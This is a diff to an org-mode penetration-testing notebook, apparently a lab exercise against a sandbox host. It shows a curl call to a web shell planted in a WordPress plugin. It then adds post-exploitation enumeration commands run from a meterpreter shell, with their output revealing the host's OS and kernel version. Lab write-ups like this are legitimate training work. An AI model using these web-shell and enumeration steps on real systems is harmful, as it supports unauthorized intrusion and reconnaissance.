@@ -3179,7 +3179,14 @@ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph p?cmd=
     #+END_SRC
     
 *** Post-Exploitation Enumeration
-    // TODO
+    #+BEGIN_SRC sh
+meterpreter > shell
+ifconfig # ip address
+hostname # ajla
+cat /etc/issue # Ubuntu 20.04.2 LTS \n \l
+cat /proc/version # Linux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021
+
+#+END_SRC
 
 
 * TODO list
